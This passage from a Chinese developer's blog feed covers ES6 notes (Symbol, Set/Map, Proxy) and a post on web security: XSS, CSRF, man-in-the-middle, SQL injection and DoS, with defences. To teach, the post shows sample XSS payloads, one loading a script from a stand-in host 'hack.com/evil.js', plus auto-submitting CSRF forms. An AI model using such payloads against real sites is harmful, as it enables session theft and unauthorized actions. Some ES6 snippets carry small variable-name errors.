<li><code>Object.getOwnPropertySymbols</code> 返回一个数组，包含对象自身的所有 Symbol 属性。</li>
<li><code>Reflect.ownKeys</code> 返回一个数组，包含对象自身的所有属性，不管是属性名是 Symbol 或字符串，也不管是否可枚举</li>
</ul>
</li>
</ul>
<h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><blockquote>
<p>新的原始数据类型，表示独一无二的值，常用来作为对象属性名避免冲突</p>
</blockquote>
<ul>
<li>Symbol 函数可以接受一个字符串作为参数，表示对 Symbol 实例的描述</li>
<li>可显示转换成字符串或者布尔值</li>
<li><p>作为对象属性名或在对象的内部定义属性时，Symbol 值必须放在方括号之中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 第一种写法</span></div><div class="line"><span class="keyword">var</span> a = &#123;&#125;;</div><div class="line">a[mySymbol] = <span class="string">'Hello!'</span>;</div><div class="line"><span class="comment">// 第二种写法</span></div><div class="line"><span class="keyword">var</span> a = &#123;</div><div class="line">  [mySymbol]: <span class="string">'Hello!'</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
<li><p>Symbol 作为属性名，该属性不会出现在 <code>for...in</code>、<code>for...of</code> 循环中，也不会被 <code>Object.keys()</code>、<code>Object.getOwnPropertyNames()</code>、<code>JSON.stringify()</code> 返回。但是，它也不是私有属性，有一个 <code>Object.getOwnPropertySymbols</code> 方法，可以获取指定对象的所有 Symbol 属性名。</p>
</li>
<li>重用 Symbol 使用 <code>Symbol.for</code>，该方法生成的变量会登记在全局变量中</li>
</ul>
<h2 id="Set-和-Map-数据结构"><a href="#Set-和-Map-数据结构" class="headerlink" title="Set 和 Map 数据结构"></a>Set 和 Map 数据结构</h2><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><blockquote>
<p>set 类似于数组，但是成员的值都是唯一的，没有重复的值</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 定义方法 1</span></div><div class="line"><span class="keyword">const</span> set1 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</div><div class="line"></div><div class="line"><span class="comment">// 定义方法 2</span></div><div class="line"><span class="keyword">const</span> set2 = <span class="keyword">new</span> <span class="built_in">Set</span>()</div><div class="line">set.add(<span class="number">1</span>)</div><div class="line">set.add(<span class="number">2</span>)</div><div class="line">set.add(<span class="number">3</span>)</div></pre></td></tr></table></figure>
<ul>
<li>Set 结构没有键名，只有键值（或者说键名和键值是同一个值）</li>
<li><p><code>Array.from</code> 方法可以将 Set 结构转为数组</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 数组去重新方法1</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">dedupe</span>(<span class="params">array</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(array));</div><div class="line">&#125;</div><div class="line"><span class="comment">// 数组去重新方法2</span></div><div class="line"><span class="keyword">let</span> unique = [...new <span class="built_in">Set</span>(arr)]</div></pre></td></tr></table></figure>
</li>
<li><p>WeakSet 结构与 Set 类似，也是不重复的值的集合</p>
<ul>
<li>WeakSet 的成员只能是对象，而不能是其他类型的值</li>
<li>WeakSet 中的对象都是弱引用，不计入垃圾回收机制，也是不可遍历的</li>
</ul>
</li>
</ul>
<h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><blockquote>
<p>Map 类似于对象，但属性名不限制为字符串（可是是任何数据结构，包括对象），由此实现更强大的hash结构</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 定义方法 1</span></div><div class="line"><span class="keyword">const</span> map1 = <span class="keyword">new</span> <span class="built_in">Map</span>([</div><div class="line">  [<span class="string">'name'</span>, <span class="string">'张三'</span>],</div><div class="line">  [<span class="string">'title'</span>, <span class="string">'Author'</span>]</div><div class="line">])</div><div class="line"></div><div class="line"><span class="comment">// 定义方法 2</span></div><div class="line"><span class="keyword">const</span> map2 = <span class="keyword">new</span> <span class="built_in">Map</span>()</div><div class="line"><span class="keyword">const</span> o = &#123;<span class="attr">p</span>: <span class="string">'Hello World'</span>&#125;</div><div class="line">m.set(o, <span class="string">'content'</span>)</div></pre></td></tr></table></figure>
<ul>
<li>注意，只有对同一个对象的引用，Map 结构才将其视为同一个键，同样的值的两个实例，在 Map 结构中被视为两个键</li>
<li>WeakMap结构与Map结构类似，也是用于生成键值对<ul>
<li>WeakMap只接受对象作为键名（null除外），不接受其他类型的值作为键名</li>
<li>WeakMap的键名所指向的对象，不计入垃圾回收机制</li>
</ul>
</li>
</ul>
<h2 id="Proxy和Reflect"><a href="#Proxy和Reflect" class="headerlink" title="Proxy和Reflect"></a>Proxy和Reflect</h2><h4 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h4><blockquote>
<p>Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写，属于一种“元编程”</p>
</blockquote>
<ul>
<li><code>var proxy = new Proxy(target, handler);</code></li>
</ul>
<h4 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h4><blockquote>
<p>与 Proxy 对象一样，也是 ES6 为了操作对象而提供的新 API，而且它与 Proxy 对象的方法是一一对应的<br>将 Object 对象的一些明显属于语言内部的方法（比如 <code>Object.defineProperty）</code>，放到 Reflect 对象上<br>修改某些 Object 方法的返回结果，让其变得更合理</p>
</blockquote>
<h2 id="编程风格"><a href="#编程风格" class="headerlink" title="编程风格"></a>编程风格</h2><ul>
<li>优先使用 <code>const</code>、然后是 <code>let</code>，不用 <code>var</code>，避免变量泄露和提升</li>
<li>使用解构赋值声明多个变量 =&gt; <code>const [a, b, c] = [1, 2, 3]</code></li>
<li>静态字符串一律使用单引号或反引号，不使用双引号。动态字符串使用反引号。</li>
<li>单行定义的对象，最后一个成员不以逗号结尾。多行定义的对象，最后一个成员以逗号结尾</li>
<li>使用扩展运算符 <code>...</code> 拷贝数组</li>
<li>如果模块默认输出一个函数，函数名的首字母应该小写，如果模块默认输出一个对象，对象名的首字母应该大写</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;入门ES6最佳选择，读完收获颇多。但关注点主要还是放在一些新的编程模式，比如 Promise 和 Generator 带来的对前端编程逻辑的巨大改变（甚至我认为， ES6中 Promise和 Generator 才是主菜，其他不过是饭前甜点罢了）。除此以外，很多以前在 ES5 中蛋疼的实现有了更优雅的实现，比如块作用域和变量提升，函数中万变的 this 等。很多东西碍于实现，在前端中可能并不会全部用上，但是至少，配合 polyfill 和打包工具，让我们在工程化中有了更进一步的统一&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/ECMAScript6入门.jpg&quot; alt=&quot;ECMAScript6入门&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我所理解的 Web 安全</title>
    <link href="https://github.com/Hyifu/2016/12/05/%E6%88%91%E6%89%80%E7%90%86%E8%A7%A3%E7%9A%84Web%E5%AE%89%E5%85%A8/"/>
    <id>https://github.com/Hyifu/2016/12/05/我所理解的Web安全/</id>
    <published>2016-12-04T16:00:00.000Z</published>
    <updated>2017-05-01T02:16:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近完成了一个关于店铺的评论插件，由于插件的特殊性质（见下图），在开发的过程中，或多或少地接触到了一些必要的安全防御手段。本来我对 web 的安全其实没有太多的研究，不过随着第二期迭代的完成，也确实意识到了自己在这方面的薄弱部分。好在项目有相当有经验的同事担当，因此开发中确实学到了很多，记录一下前端实际开发中遇到的安全问题和我个人的理解<br><img src="/images/我所理解的web安全-评价插件.png" alt="我所理解的web安全-评价插件"></p>
<a id="more"></a>
<h2 id="为什么不安全"><a href="#为什么不安全" class="headerlink" title="为什么不安全"></a>为什么不安全</h2><p>web 作为互联网的最佳载体，在这几年我们见证了它迅速发展，JavaScript 在几年间成为最热门的语言，作为 Web 开发的最直接与用户打交道的一环，前端开发工程师的地位日益提高，责任也越来越大，安全问题就是其中的一个点。</p>
<p>在 Sass 建站服务中我们一直重视安全，比如前面头图中的插件就有许多可以自定义的代码，这里需要注意防止 XSS 注入，不过其他大部分防御措施还是基于服务端，比如 DDos 防御系统，信息逻辑全部在后端验证，授权体系等等，这导致有些前端开发者同事们甚至都不知道什么是 XSS 攻击（比如说半年前的我）。但是，前端对于攻击的防范，一定是建立在了解对手进行攻击的方式的基础上的。</p>
<p>我们讨论安全，是因为不是所有的用户都是可信赖的，网络世界跟现实世界一样，总有恶意分子在时刻窥视着。尤其是对于电商而言，因为涉及到金钱的交易，其安全问题造成的影响应该比普通的博客，论坛更加严重。</p>
<p>我们也知道，没有绝对安全的东西，即便是微软、谷歌这样的超级公司，也难免存在一些漏洞。我们所说的安全是指，在可承受的风险范围内是安全的，这就好比建一栋楼，它可以抵抗 12 级大风的攻击，但也绝对不可能抵抗一个战略导弹的直接命中，因为被导弹攻击的概率及其地微小，而做到这种防御所需要的成本及其昂贵。因此所有的安全措施都是风险和成本中间的一个权衡。</p>
<p>实际的软件开发中，我们一般只需要做到常规的安全防范就足以应付 99% 以上的攻击了，与安全防范一样，攻击也是一个成本与收益的权衡，没见过攻击者花费几个月的时间，只为了得到一个普通账户的下单记录。这就是我对安全的理解，知己知彼，了解常规攻击及其防范是第一件要做的事</p>
<blockquote>
<p>《白帽子讲 Web 安全》这本书的第一章，“我的安全世界观”中提到：<strong>安全问题的本质是信任问题</strong>，这本书真心浅显易懂又深入问题的根本，推荐至少阅读一遍，尤其是讨论浏览器安全的第二部分，讲述了许多令人惊叹的攻击方式，对前端安全的认识甚是有帮助</p>
</blockquote>
<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>Cross Site Scripting 简称 XSS（简写区分了层叠样式表），是最最最常见的基础攻击手段。一般是指通过“HTML”注入的方式在网页插入恶意的脚本，控制用户的浏览器行为，是 Web 安全的头号大敌。在我参与的项目中，由于客户可自定义的需求存在，因此用户输入和自定义代码随处可见（比如 B 端主题系统中的自定义模块样式，C 端的用户信息完善），因此对跨站脚本防御是非常重要对一个地方。下面是 XSS 的基础展示<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"$&#123;name&#125;"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这里定义了一个输入框，用户可以直接修改自己的用户名 <code>${name}</code>，服务器保存提交并直接输出到页面中，那么假设用户并不是常规地输入用户名，而是输入了这样的代码：<br><code>&quot; onfocus=&quot;alert(document.cookie)</code><br>那么最终输出的页面将变成这样<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onfocus</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这一次输入框获得焦点的时候，页面弹出了 cookie 信息，这显然并不是开发者希望出现的状况，这就是 XSS 攻击的基本原理。</p>
<blockquote>
<p><a href="https://www.w3.org/TR/CSP/" target="_blank" rel="external">Content Security Policy</a>（CSP，内容安全策略）是对跨站脚本对一个强大的防范机制，Chrome 内建对 App 应用强制使用这一策略，但是由于其限制颇多，规则复杂，开发者维护也比较艰难，尚未得到大面积的普及</p>
</blockquote>
<p>XSS 根据攻击的方式可分为两种：</p>
<ul>
<li>反射型 XSS</li>
<li>存储型 XSS</li>
</ul>
<blockquote>
<p>普遍认为还有一种攻击方式是 DOM based 类型，但其实我个人认为它依然是基于反射触发的一种，只是实现的方式比较特殊而已。另外，考虑 XSS 攻击的方式有很多变种，因此只考虑主流的两种分类：依据其是否需要用户交互</p>
</blockquote>
<h4 id="反射型-XSS（非持久型-XSS）"><a href="#反射型-XSS（非持久型-XSS）" class="headerlink" title="反射型 XSS（非持久型 XSS）"></a>反射型 XSS（非持久型 XSS）</h4><blockquote>
<p>一般只是把用户的输入“反射”给浏览器，通常通过诱导用户“访问”一个恶意链接，因为通常是一次性的，因此又叫做非持久性 XSS</p>
</blockquote>
<p>比如友好速搭的文档中心中，具备一个搜索功能，当服务器没有找到搜索关键词时会直接显示该内容不存在，如下图：<br><img src="/images/我所理解的web安全-XSS-1.png" alt="我所理解的web安全-XSS-1"></p>
<p>点击查看 <a href="https://docs.youhaosuda.com/search?q=XSS" target="_blank" rel="external">没有搜索到与“XSS”相关的内容</a></p>
<p>我们观察发现它是基于 URL 查询字符串来进行检索的（这样方便开发者们定位文档），假设我们的后台是直接输出这个查询字符串，就会存在一个 XSS 漏洞，考虑以下 URL：<br><code>https://docs.youhaosuda.com/search?q=&lt;script src=&quot;hack.com/evil.js&quot;&gt;</code></p>
<p>查询字符串中附加了一个脚本 <code>&lt;script src=&quot;hack.com/evil.js&quot;&gt;</code>，这会导致页面直接潜入了一个恶意脚本（因为一定查不到对应的文档），这个脚本执行后可能会偷取用户（用户极有可能已经登录）的敏感信息，然后通过图像ping等跨域方式发送到攻击者到服务器</p>
<h4 id="存储型-XSS（持久型-XSS）"><a href="#存储型-XSS（持久型-XSS）" class="headerlink" title="存储型 XSS（持久型 XSS）"></a>存储型 XSS（持久型 XSS）</h4><blockquote>
<p>一般将恶意代码存储在服务器，所有访问该页面的用户都将遭到攻击，具有更好的稳定性和持续性，可以威胁大量的用户，因此又叫做持久性 XSS</p>
</blockquote>
<p>这种攻击最常见于博客论坛这类通过文章／帖子可以获得大量流量到地方，假如攻击者发现了知乎专栏存在一个 XSS 漏洞，在发表文章时通过巧妙到方法绕过限制从而内嵌一个恶意脚本，于是读者阅读完这篇文章时，恶意脚本已经在背后完成指定操作（如自动关注某人，点赞，转发等，因此传播速度非常快）</p>
<h4 id="XSS-防御手段"><a href="#XSS-防御手段" class="headerlink" title="XSS 防御手段"></a>XSS 防御手段</h4><p>前面提到了 XSS 的原理和攻击方式，那么作为开发者更应该关心的是如何避免 XSS 漏洞；虽然现在的浏览器对于 XSS 的防护（尤其对反射型 XSS）提供了各种过滤器，但是开发者必须考虑到最糟糕的时候。一般有以下方式进行防范：</p>
<ul>
<li><p>输入转义</p>
<blockquote>
<p>转义一般前后端都需要做，但由于前端可以被绕过，因此后端才是主力。需要 HTML Encode 的内容一般包括尖括号，敏感标签及特殊字符等。</p>
</blockquote>
</li>
<li><p>输入过滤</p>
<blockquote>
<p>对于用户输入等内容进行校验，如填写年龄等输入框应该严格限制为 1～99 等数字。</p>
</blockquote>
</li>
<li><p>限制长度</p>
<blockquote>
<p>如限制用户名长度不得多于20个，以此限制攻击代码等功能</p>
</blockquote>
</li>
<li><p>HttpOnly</p>
<blockquote>
<p>这里一般是为了防止脚本获取会话 Cookie</p>
</blockquote>
</li>
</ul>
<p>对于 XSS 攻击最有效的防御手段还是进行输入输出过滤及转义，但是过滤时需要考虑到一点，攻击手段是变幻无常的，我们无法确定攻击者到底使用什么样的字符进行渗入，因此常规采用的黑名单过滤敏感词的安全性是值得怀疑的，如果需要更高的安全强度，那么应该采用更稳妥的白名单过滤。</p>
<p>一般而言，做到前面的防范就可以避免大部分的 XSS 漏洞了，前后端的主流框架在设计时一般会考虑到安全防范，因此在开发时，尽量使用最新的框架也有利于提高安全性。对于前端开发而言，必要时可以引入专业的 XSS 防御模块进行输入校验。</p>
<h2 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h2><p>顾名思义，CSRF 是伪装用户进行非法的操作，我们知道，HTTP 是无状态的，一般通过存活从 cookie／session 来进行身份的判断。假如我登录了一个博客，删除了其中一片文章，这个操作是使用一个 GET 请求进行的：<br><code>http://hyifu.com/delete?pageid=001</code></p>
<p>我们注意到，<code>delete?pageid=001</code> 代表着删除 <code>id</code> 为 <code>001</code> 的文章，那么如果希望删除 <code>id</code> 为 <code>002</code> 的文章，我其实直接打开一个标签页输入 <code>http://hyifu.com/delete?pageid=002</code> 就可以做到：因为这个时候服务器认为这是同一个人在进行正常的操作（因为 session cookie 一致）。</p>
<p>考虑这个规则被我的死对头知道了，他用 QQ 发了一个链接给我，这个链接打开的页面主要内容如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>你的文章太烂了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">"display:none"</span> <span class="attr">src</span>=<span class="string">"http://hyifu.com/delete?pageid=003"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>会发生什么样的事情呢？我打开这个链接发现这只是一个无聊的笑话，可事实是我关掉这个页面回到我自己的博客却发现第三篇文章不见了！这就是 CSRF，伪装了我的身份进行了非法的操作。</p>
<blockquote>
<p>前面这个例子并不总是能成功，因为有些浏览器会在 img 等可以跨域的标签的请求中会禁止携带认证 cookie，但这只是一种攻击方式，可能的攻击方式还很多，比如直接诱导点击链接</p>
</blockquote>
<p>你可能认为，这是基于 GET 操作进行的攻击而已，我把敏感的操作都用 POST 请求进行就可以了，但实际上，刚才那个页面也许是这样的：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>你的文章太烂了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://hyifu.com/delete"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"pageid"</span> <span class="attr">value</span>=<span class="string">"003"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.forms[<span class="number">0</span>].submit()</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>GET 和 POST 的安全性，在大部分情况下是一样的，攻击者一般不会在意是不是直接在 url 中附带参数，我们的防御措施应该不是基于这个点，而是关注其本质：伪装！是的，我们注意到，攻击能够成功的很大一部分原因就是攻击者知道我们的参数是如何提交上去的。应对措施的实现思路也是基于此展开：</p>
<ol>
<li><p>既然你需要伪造请求，那么设计一个很难猜的请求就好了：使用随机性的请求入口</p>
<blockquote>
<p><code>http://hyifu.com/delete</code> 与 <code>http://hyifu.com/3c8d9po8</code> 比较，攻击者显然更容易猜到前者，但如此随机的 API 可不利于后端接口的统一，因此需要更好的方法</p>
</blockquote>
</li>
<li><p>考虑攻击的时候用户不知情，那么我的请求必须附带一个参数：操作验证码</p>
<blockquote>
<p>大部分的网站的核心操作都会带有验证码，更严格的如手机验证码和邮件验证码，但是如果简单的操作也要使用验证码，用户体验会大打折扣</p>
</blockquote>
</li>
<li><p>攻击的时候，一般都是在攻击者设计的页面访问目标页面，那么请求带上 <code>Referer</code>?</p>
<blockquote>
<p>这是一条很好的方法，如果所有访问都足以提供准确的 <code>Referer</code>。然而由于隐私的考虑，有时 <code>Referer</code> 的发送会被限制，因此这只能是一个参考的手段</p>
</blockquote>
</li>
<li><p>对了，既然请求是其他页面发生的，那么在服务器生成的 HTML 生成一个唯一的随机码，请求必须附带这个随机码</p>
<blockquote>
<p>这是最常用最有效的方法：Token；服务器生成一个足够随机的“密码”，这个密码同时放在 HTML 和 Cookie（Session也是可以的），每次请求必须附带这个 Token 参数，如果参数与 Cookie 一致，则认为请求来自原页面并成功，否则判断为失败</p>
</blockquote>
</li>
</ol>
<p>总结一下作为最佳实践：使用随机 Token 防止请求伪造，请求使用 POST 避免 Token 暴露，同时在关键的操作附带验证码核实是否本人（短信或邮件）</p>
<p>应该知道，CSRF 跟 XSS 是两种完全不同的攻击方式，CSRF 的防御手段在已经被 XSS 攻击的条件下是无效的（Token 或验证码随时可以被 XSS 脚本偷取）</p>
<h2 id="中间人攻击（Man-in-the-MiddleAttack，MITM）"><a href="#中间人攻击（Man-in-the-MiddleAttack，MITM）" class="headerlink" title="中间人攻击（Man-in-the-MiddleAttack，MITM）"></a>中间人攻击（Man-in-the-MiddleAttack，MITM）</h2><p>中间人攻击算是最常见最有效的一种攻击方式了，攻击原理非常简单：攻击者劫持了客户端和服务器之间的通讯，因此可以窃听通讯的内容，或者在通讯内容中伪装客户端或服务器进行欺骗。中间人攻击的原理比较简单，我们的应对方式一般是会话加密和身份验证，其只要实现方式是启用安全传输层协议（TLS，Transport Layer Security）</p>
<blockquote>
<p>但其实即使使用了 HTTPS 也还是可能遭遇劫持，比如 DNS劫持，攻击者通过 HTTP 劫持了你发送给银行的数据，攻击者自己使用 HTTPS 与银行进行正常的交互，该技术叫“SSL剥离”，当然，这对开发者而言很难避免，就需要用户及时发现了</p>
</blockquote>
<p>友好速搭很早就全面启用了全站 HTTPS 访问，因此在这里我主要分享一下关于 HTTPS 的必要性和原理，其实是一个很有趣的故事，生动形象地阐述了 HTTPS 诞生的背景和原理:</p>
<blockquote>
<p>作者：牟旭东<br>链接：<a href="https://www.zhihu.com/question/21518760/answer/19698894" target="_blank" rel="external">https://www.zhihu.com/question/21518760/answer/19698894</a><br>来源：知乎</p>
<p>从前山上有座庙，庙里有个和尚……，别胡闹了，老和尚来了。<br>小和尚问老和尚：ssl 为什么会让 http 安全？<br>老和尚答道：譬如你我都有一个同样的密码，我发信给你时用这个密码加密，你收到我发的信，用这个密码解密，就能知道我信的内容，其他的闲杂人等，就算偷偷拿到了信，由于不知道这个密码，也只能望信兴叹，这个密码就叫做对称密码。ssl 使用对称密码对 http 内容进行加解密，所以让 http 安全了，常用的加解密算法主要有 3DES 和 AES 等。<br>小和尚摸摸脑袋问老和尚：师傅，如果我们两人选择“和尚”作为密码，再创造一个和尚算法，我们俩之间的通信不就高枕无忧了？<br>老和尚当头给了小和尚一戒尺：那我要给山下的小花写情书，还得用“和尚”这个密码不成？想了想又给了小和尚一戒尺：虽然我们是和尚，不是码农，也不能自己造轮子，当初一堆牛人码农造出了 Wifi 的安全算法 WEP，后来发现是一绣花枕头，在安全界传为笑谈；况且小花只知道 3DES 和 AES，哪知道和尚算法？<br>小和尚问到：那师傅何解？<br>老和尚：我和小花只要知道每封信的密码，就可以读到对方加密的信件，关键是我们互相之间怎么知道这个对称密码。你说，我要是将密码写封信给她，信被别人偷了，那大家不都知道我们的密码了，也就能够读懂我们情书了。不过还是有解的，这里我用到了江湖中秘传的非对称密码。我现在手头有两个密码，一个叫“公钥”，一个叫“私钥”，公钥发布到了江湖上，好多人都知道，私钥嘛，江湖上只有我一个人知道；这两个密钥有数学相关性，就是说用公钥加密的信件，可以用私钥解开，但是用公钥却解不开。公钥小花是知道的，她每次给我写信，都要我的公钥加密她的对称密码，单独写一张密码纸，然后用她的对称密码加密她的信件，这样我用我的私钥可以解出这个对称密码，再用这个对称密码来解密她的信件。<br>老和尚顿了顿：可惜她用的对称密码老是“和尚为什么写情书”这一类，所以我每次解开密码纸时总是怅然若失，其实我钟意的对称密码是诸如“风花”“雪月”什么的，最头痛的是，我还不得不用“和尚为什么写情书”这个密码来加密我给小花回的情书，人世间最痛苦的事莫过于如此。可我哪里知道，其实有人比我更痛苦。山下的张屠夫，暗恋小花很多年，看着我们鸿雁传书，心中很不是滋味，主动毛遂自荐代替香客给我们送信。在他第一次给小花送信时，就给了小花他自己的公钥，谎称是我公钥刚刚更新了，小花信以为真，之后的信件对称密码都用张屠夫的这个公钥加密了，张屠夫拿到回信后，用他自己的私钥解开了小花的对称密码，然后用这个对称密码，不仅能够看到了小花信件的所有内容，还能使用这个密码伪造小花给我写信，同时还能用他的私钥加密给小花的信件。渐渐我发现信件变味了，尽管心生疑惑，但是没有确切的证据，一次我写信问小花第一次使用的对称密码，回信中“和尚为什么写情书”赫然在列，于是我的疑惑稍稍减轻。直到有一次去拜会嵩山少林寺老方丈才顿悟，原来由于我的公钥没有火印，任何人都可以伪造一份公钥宣称是我的，这样这个人即能读到别人写给我的信，也能伪造别人给我写信，同样也能读到我的回信，也能伪造我给别人的回信，这种邪门武功江湖上称之“Man-in-the-middle attack”。唯一的破解就是使用嵩山少林寺的火印，这个火印可有讲究了，需要将我的公钥及个人在江湖地位提交给18罗汉委员会，他们会根据我的这些信息使用委员会私钥进行数字签名，签名的信息凸现在火印上，有火印的公钥真实性在江湖上无人质疑，要知道18罗汉可是无人敢得罪的。<br>小和尚问：那然后呢？<br>老和尚：从嵩山少林寺回山上寺庙时，我将有火印的公钥亲自给小花送去，可是之后再也没有收到小花的来信。过了一年才知道，其实小花还是给我写过信的，当时信确实是用有火印的公钥加密，张屠夫拿到信后，由于不知道我的私钥，解不开小花的密码信，所以一怒之下将信件全部烧毁了。也由于张屠夫无法知道小花的对称密码而无法回信，小花发出几封信后石沉大海，也心生疑惑，到处打听我的近况。这下张屠夫急了，他使用我发布的公钥，仿照小花的语气，给我发来一封信。拿到信时我就觉得奇怪，信纸上怎么有一股猪油的味道，结尾竟然还关切的询问我的私钥。情知有诈，我思量无论如何要找到办法让我知道来的信是否真是小花所写。后来竟然让我想到了办法….<br>老和尚摸着光头说：这头发可不是白掉的，我托香客给小花带话，我一切安好，希望她也拥有属于自己的一段幸福，不对，是一对非对称密钥。小花委托小镇美女协会给小花公钥打上火印后，托香客给我送来，这样小花在每次给我写信时，都会在密码纸上贴上一朵小牡丹，牡丹上写上用她自己的私钥加密过的给我的留言，这样我收到自称是小花的信后，我会先抽出密码纸，取下小牡丹，使用小花的公钥解密这段留言，如果解不出来，我会直接将整封信连同密码纸一起扔掉，因为这封信一定不是小花写的，如果能够解出来，这封信才能确信来之于小花，我才仔细的解码阅读。<br>小和尚：难怪听说张屠夫是被活活气死的。您这情书整的，我头都大了，我长大后，有想法直接扯着嗓子对山下喊，也省的这么些麻烦。不过我倒是明白了楼上的话，ssl 握手阶段，就是要解决什么看火印，读牡丹，解密码纸，确实够麻烦的，所以性能瓶颈在这里，一旦双方都知道了对称密码，之后就是行云流水的解码读信阶段了，相对轻松很多。</p>
</blockquote>
<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>这一部分其实主要还是要后端的同学做，不过其实这里是最常见的攻击方式了。我在开发评价插件时，由于人员的变动，前后共跟三个高级后端一起开发，在最后高级版本上线时，后端的主程透露了这么一个信息：这是他接手过的的 SQL 防注入最糟糕的项目，到处都是安全隐患（当然，这已经是过去时了）。因此在这里也稍微了解一下</p>
<p>SQL 注入其实是针对后端服务器的 “XSS 攻击”，攻击者通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是SQL语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
<p>至于防御方式，其实跟 XSS 防御类似，核心点在于永远不要相信用户的输入，因此在后端输入中进行转义和过滤，不动态拼接 SQL 语句<br>另外，数据库读写分离既有利于 API 的分离，也可以在一定程度上保护数据（读写操作的权限安全级别不同，对写操作进行更加严格的校验和过滤）</p>
<h2 id="拒绝服务攻击（Dos）"><a href="#拒绝服务攻击（Dos）" class="headerlink" title="拒绝服务攻击（Dos）"></a>拒绝服务攻击（Dos）</h2><p>如果说前面的各种攻击方式需要的条件是被攻击方的后台服务器存在漏洞，那么拒绝服务攻击就真的是简单粗暴的一种方式。理解 Dos 攻击很简单，设想你开了一家饭馆，你竞争对手雇佣了一百个人堵在你饭馆门前，不让顾客进去吃饭，那么你就遭遇了一次 Dos 攻击——攻击者不断请求服务器，使得服务器不能对其他的合理请求作出反应，进而使得服务瘫痪（没有服务到目标）。这种攻击方式的进阶版本为分布式拒绝服务攻击（DDos）。</p>
